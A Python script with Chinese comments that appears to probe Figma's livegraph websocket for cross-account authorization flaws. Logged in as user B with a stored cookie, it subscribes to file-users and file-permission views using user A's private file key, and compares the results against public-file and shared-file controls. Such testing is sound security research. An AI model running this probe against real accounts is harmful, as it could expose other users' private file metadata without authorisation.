"""文件敏感元数据 view 越权测试:B 登录,注入 A 的文件
- FileUsersForFileView: args=[fileKey] → activeFileUsers(文件内活动用户身份)
- FilePermissionsLgShadowView: args=[fileKey, linkAccessOverrideKey?] → 权限策略(canEditFromPolicies)
序列:基线(公开文件)→ 注入(A私有文件 ⭐)→ 对照(A Make 共享文件)
"""
import sys, json, asyncio, io
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

B_UID = "1667396392129259941"
PRIV_FILE = "9MmnJNhhwn2hDNEqLoMToP"    # A 的私有文件(注入 ⭐)
MAKE_FILE = "5zb5YkoxMa09KpqOyuLcHD"    # A 的 Make 文件(B 可读,对照)
PUB_FILE = "bv2nMIdFf4u3dESGail4sm"     # 公开文件(基线)
CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
HASH = "ab" * 16

def lg_url(client_url="bv2nMIdFf4u3dESGail4sm"):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds"
            f"&userId={B_UID}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{client_url}"
            f"&connectionType=initial&reconnect=0")

def auth():
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": B_UID, "anonymousUserId": None},
            "tags": {"clientType": "web", "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                     "clientUrl": "https://www.figma.com/files"},
            "clientRequestedVersion": 2}

async def sub(label, view, args, wait=8):
    frames = []
    try:
        async with websockets.connect(lg_url(),
                                      additional_headers={"User-Agent": UA, "Cookie": CK_B,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth()))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": HASH, "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}")
        return
    hits = [f for f in frames if '"initial":' in f or 'viewSubscriptionFailed' in f or '"error"' in f]
    total = sum(len(f) for f in hits)
    print(f"\n[{label}] 帧={len(frames)} 有效={len(hits)} 总B={total}")
    for f in hits:
        if 'viewSubscriptionFailed' in f or '"error"' in f:
            print(f"  🚫 {f[:400]}")
        else:
            print(f"  🖼 {len(f)}B {f[:1400]}")
            print()

async def main():
    print("======== 文件敏感元数据 view 越权测试(B 登录) ========")
    # FileUsersForFileView
    await sub("基线 Users → 公开文件", "FileUsersForFileView", {"fileKey": PUB_FILE})
    await sub("注入⭐ Users → A私有文件", "FileUsersForFileView", {"fileKey": PRIV_FILE})
    await sub("对照 Users → A Make文件", "FileUsersForFileView", {"fileKey": MAKE_FILE})
    # FilePermissionsLgShadowView
    await sub("基线 Perm → 公开文件", "FilePermissionsLgShadowView", {"fileKey": PUB_FILE})
    await sub("注入⭐ Perm → A私有文件", "FilePermissionsLgShadowView", {"fileKey": PRIV_FILE})
    await sub("对照 Perm → A Make文件", "FilePermissionsLgShadowView", {"fileKey": MAKE_FILE})

asyncio.run(main())
